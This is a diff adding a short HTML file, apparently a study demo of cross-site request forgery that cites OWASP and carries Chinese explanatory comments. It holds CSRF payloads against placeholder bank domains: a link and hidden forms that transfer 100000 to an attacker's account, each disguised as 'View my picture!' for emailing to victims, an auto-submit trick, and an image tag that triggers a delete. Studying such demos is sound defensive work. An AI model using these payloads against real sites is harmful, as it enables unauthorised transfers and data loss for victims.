@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+  <style>
+    body {
+      padding: 100px;
+    }
+    iframe {
+      width: 1000px;
+      height: 400px;
+      margin-top: 50px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) -->
+
+<p>GET:</p>
+
+<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">查看我的图片！</a>
+
+<p>POST:</p>
+
+<!-- 给用户发的 email 中包含以下代码 -->
+<form action="http://my-bank.com/transfer.do" method="POST">
+  <input type="hidden" name="acct" value="MARIA"/>
+  <input type="hidden" name="amount" value="100000"/>
+  <input type="submit" value="查看我的图片！"/>
+</form>
+
+<!--
+POST Form 自执行
+<body onload="document.forms[0].submit()">
+<form...
+-->
+
+<!-- 不同域，理应不携带 cookie  -->
+<!-- 实际上浏览器携带了 -->
+<img src="http://example.com/op?action=deleted&id=2" alt="">
+
+<!-- 不同域，理应不携带 cookie -->
+<!-- 通过 form 表单，实际上浏览器会带上 cookie，不过 form 表单只支持 get 和 post 两种方法 -->
+<form action="http://my-bank.com/transfer.do" method="POST">
+  <input type="hidden" name="acct" value="MARIA"/>
+  <input type="hidden" name="amount" value="100000"/>
+  <input type="submit" value="查看我的图片！"/>
+</form>
+
+<!-- iframe 内部同域，允许携带 cookie, 但无法直接操作 iframe 内任何元素，只能通过 postMessage 通信 -->
+<!-- 实际上也是这样实现的吧 -->
+<iframe id="steal" src="https://baidu.com" frameborder="0"></iframe>
+
+</body>
+</html>
